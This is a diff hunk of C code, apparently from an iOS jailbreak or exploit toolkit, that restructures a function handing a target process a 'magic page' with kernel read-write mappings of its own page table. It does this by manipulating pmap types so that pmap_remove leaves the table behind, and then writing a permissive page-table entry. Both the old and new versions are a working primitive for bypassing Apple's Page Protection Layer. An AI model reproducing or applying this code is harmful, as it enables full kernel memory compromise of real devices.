@@ -25,43 +25,49 @@ int handoffPPLPrimitives(pid_t pid, uint64_t *magicPageOut)
 {
 	if (!pid || !magicPageOut) return -1;
 
-	uint64_t proc = proc_for_pid(pid);
-	if (proc == 0) return -2;
-	
-	uint64_t task = proc_get_task(proc);
-	if (task == 0) return -3;
-	
-	uint64_t vmMap = task_get_vm_map(task);
-	if (vmMap == 0) return -4;
-	
-	uint64_t pmap = vm_map_get_pmap(vmMap);
-	if (pmap == 0) return -5;
-	
-	// Map the fake page
-	kern_return_t kr = pmap_enter_options_addr(pmap, FAKE_PHYSPAGE_TO_MAP, PPL_MAP_ADDR);
-	if (kr != KERN_SUCCESS) {
-		return -6;
+	int ret = 0;
+
+	bool proc_needs_release = false;
+	uint64_t proc = proc_for_pid(pid, &proc_needs_release);
+	if (proc) {
+		uint64_t task = proc_get_task(proc);
+		if (task) {
+			uint64_t vmMap = task_get_vm_map(task);
+			if (vmMap) {
+				uint64_t pmap = vm_map_get_pmap(vmMap);
+				if (pmap) {
+					kern_return_t kr = pmap_enter_options_addr(pmap, FAKE_PHYSPAGE_TO_MAP, PPL_MAP_ADDR);
+					if (kr == KERN_SUCCESS) {
+						// Temporarily change pmap type to nested
+						pmap_set_type(pmap, 3);
+
+						// Remove mapping (table will not be removed because we changed the pmap type)
+						pmap_remove(pmap, PPL_MAP_ADDR, PPL_MAP_ADDR + 0x4000);
+
+						// Change type back
+						pmap_set_type(pmap, 0);
+
+						// Change the mapping to map the underlying page table
+						uint64_t table2Entry = pmap_lv2(pmap, PPL_MAP_ADDR);
+						if ((table2Entry & 0x3) == 0x3) {
+							uint64_t table3 = table2Entry & 0xFFFFFFFFC000ULL;
+							uint64_t pte = table3 | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
+							physwrite64(table3, pte);
+
+							*magicPageOut = PPL_MAP_ADDR;
+						}
+						else { ret = -7; }
+					}
+					else { ret = -6; }
+				}
+				else { ret = -5; }
+			}
+			else { ret = -4; }
+		}
+		else { ret = -3; }
+		if (proc_needs_release) proc_rele(proc);
 	}
-	
-	// Temporarily change pmap type to nested
-	pmap_set_type(pmap, 3);
-	
-	// Remove mapping (table will not be removed because we changed the pmap type)
-	pmap_remove(pmap, PPL_MAP_ADDR, PPL_MAP_ADDR + 0x4000);
-	
-	// Change type back
-	pmap_set_type(pmap, 0);
-	
-	// Change the mapping to map the underlying page table
-	uint64_t table2Entry = pmap_lv2(pmap, PPL_MAP_ADDR);
-	if ((table2Entry & 0x3) != 0x3) {
-		return -7;
-	}
-	
-	uint64_t table3 = table2Entry & 0xFFFFFFFFC000ULL;
-	uint64_t pte = table3 | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
-	physwrite64(table3, pte);
-	
-	*magicPageOut = PPL_MAP_ADDR;
-	return 0;
+	else { ret = -2; }
+
+	return ret;
 }
